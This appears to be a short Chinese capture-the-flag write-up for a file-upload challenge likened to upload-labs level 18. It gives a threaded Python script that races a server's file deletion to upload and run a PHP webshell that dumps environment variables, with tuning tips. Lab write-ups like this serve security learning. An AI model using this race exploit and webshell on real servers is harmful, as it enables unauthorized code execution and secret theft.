# 第十五章

完全等于upload-labs的第18关： https://www.cnblogs.com/CVE-Lemon/p/17806227.html

（甚至参数名都是一样的）

```py
import requests
import concurrent.futures
import threading
URL=""
def request(stop_event):
    url = f"{URL}upload.php"
    files = {'upload_file': open('shell.php', 'rb')}
    data = {'submit': '上传'}
    requests.post(url=url, data=data, files=files)
    r=requests.get(f'{URL}uploads/shell.php')
    if r.status_code == 200:
        print('OK')
        print(r.text)
        stop_event.set()
def main():
    num_requests = 800
    max_threads = 80
    stop_event = threading.Event()
    with concurrent.futures.ThreadPoolExecutor(max_threads) as executor:
        for _ in range(num_requests):
            if not stop_event.is_set():
                executor.submit(request, stop_event)
            else:
                break
    print("Program stopped")
if __name__ == "__main__":
    main()
```
`shell.php`的内容是：
```php
<?=`env`;
```
注意`num_requests`和`max_threads`不能设置得太高，否则wsrx会崩（估计是因为同一时刻的连接不能超过一个上限）

得到200的status code不等于成功。有可能遇到这样的提示：
```html
Unknown: Failed to open stream: No such file or directory in <b>Unknown</b> on line <b>0</b><br />
```
虽然请求成功到达了文件，但php真正解析并执行文件时文件被删除了。运气不好，多试几次或者把`num_requests`和`max_threads`参数调高可能就可以了